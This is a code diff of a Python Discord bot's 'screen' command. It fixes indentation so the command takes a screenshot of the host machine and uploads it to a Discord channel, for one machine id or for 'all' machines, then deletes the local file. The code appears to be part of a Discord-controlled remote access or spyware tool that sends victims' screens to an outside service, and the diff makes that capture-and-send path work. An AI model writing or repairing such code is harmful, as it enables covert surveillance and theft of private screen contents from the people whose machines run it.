@@ -24,8 +24,8 @@ scrdir = os.path.join(script_dir, scrnm)
 print("START")
 
 #Token and channel id
-Token = "Insert token here"
-chnid = 0 #insert channel id here
+Token = "insert token here"
+chnid = 0 #insert channel id
 
 #Get identifcation for direct commands
 try:
@@ -145,40 +145,38 @@ async def test(ctx, *, name: str = None):
 @bot.command(name='screen')
 async def screen(ctx, *, name: str = None):
     if name == strid:                   #Send to only specified id
-        if name == strid:
-            print("K")
-            pyautogui.screenshot(scrdir)#take screenshot
+        print("K")
+        pyautogui.screenshot(scrdir)#take screenshot
 
-            we=0
+        we=0
 
-            while we < 2:
-                we += 1
-                await ctx.send(content=f"dirscreen: {strid}", file=discord.File(scrdir)) #send screenshot
+        while we < 2:
+            we += 1
+            await ctx.send(content=f"dirscreen: {strid}", file=discord.File(scrdir)) #send screenshot
         
-                try:
-                    # Delete the file
-                    we += 1
-                    os.remove(scrdir)
-                except Exception as e:
-                    print("ohno") 
+            try:
+                # Delete the file
+                we += 1
+                os.remove(scrdir)
+            except Exception as e:
+                print("ohno") 
 
     elif name == "all":                   #Send to all
-        if name == strid:
-            print("K")
-            pyautogui.screenshot(scrdir) #take screenshot
+        print("K")
+        pyautogui.screenshot(scrdir) #take screenshot
 
-            we=0
+        we=0
 
-            while we < 2:
-                we += 1
-                await ctx.send(content=f"screen:{strid}", file=discord.File(scrdir))#send screenshot
+        while we < 2:
+            we += 1
+            await ctx.send(content=f"screen:{strid}", file=discord.File(scrdir)) #send screenshot
         
-                try:
-                    # Delete the file
-                    we += 1
-                    os.remove(scrdir)
-                except Exception as e:
-                    print("ohno") 
+            try:
+                # Delete the file
+                we += 1
+                os.remove(scrdir)
+            except Exception as e:
+                print("ohno") 
 
     else:
         print("0")
